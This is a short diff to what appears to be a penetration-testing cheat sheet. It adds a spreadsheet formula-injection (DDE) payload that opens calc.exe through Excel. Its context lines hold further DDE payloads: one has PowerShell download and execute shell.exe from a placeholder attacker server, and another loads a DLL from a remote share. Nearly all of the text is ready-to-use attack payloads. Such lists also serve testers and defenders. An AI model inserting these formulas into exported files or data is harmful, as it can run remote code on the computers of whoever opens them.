@@ -111,6 +111,7 @@ https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-uploa
 	=cmd|' /C notepad'!'A1'
 	=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
 	=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
+	=@MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!_xlbgnm.A1
 
 # Android Apk VAPT
 ## Insecure-data-storage
